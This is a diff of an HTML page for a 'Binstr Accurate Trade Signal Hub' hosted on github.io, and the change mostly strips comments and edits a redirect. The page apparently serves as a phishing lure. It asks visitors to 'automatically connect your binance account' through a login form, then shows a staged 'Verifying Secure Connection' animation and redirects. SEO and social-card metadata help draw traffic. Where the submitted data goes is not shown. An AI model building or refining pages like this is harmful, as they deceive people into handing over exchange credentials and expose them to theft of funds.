@@ -5,11 +5,9 @@
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Binstr Accurate Trade Signal Hub</title>
 
-<!-- Primary SEO -->
 <meta name="title" content="Binstr Accurate Trade Signal Hub">
 <meta name="description" content="Get real-time accurate trading signals and professional market insights. Join our premium signal platform today.">
 
-<!-- Open Graph -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/">
 <meta property="og:title" content="Binstr Accurate Trade Signal Hub">
@@ -18,7 +16,6 @@
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 
-<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Binstr Accurate Trade Signal Hub">
 <meta name="twitter:description" content="Get real-time accurate trading signals and professional market insights.">
@@ -59,7 +56,6 @@ body.dark .theme{background:#222;color:white;}
 <div class="app">
 <div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
 
-<!-- LOGIN PAGE -->
 <div class="page" id="login">
 <img src="logo.png" class="logo">
 <h1>Connect Trading Account Routing Software</h1>
@@ -87,7 +83,6 @@ click on connect to automatically connect your binance account to the scalping r
 </form>
 </div>
 
-<!-- VERIFY PAGE -->
 <div class="page verify" id="verify" style="left:100%">
 <img src="logo.png" class="logo">
 <h1>Verifying Secure Connection</h1>
@@ -125,13 +120,11 @@ form.addEventListener("submit",(e)=>{
 
   btn.disabled=true;
 
-  // slide to verify screen
   login.style.transform="translateX(-100%)";
   verify.style.transform="translateX(-100%)";
 
-  // immediate redirect after short smooth animation
   setTimeout(()=>{
-    window.location.href = "home.html";
+    window.location.replace("/Binstraccuratetradesignal/home.html");
   },2000);
 });
 </script>
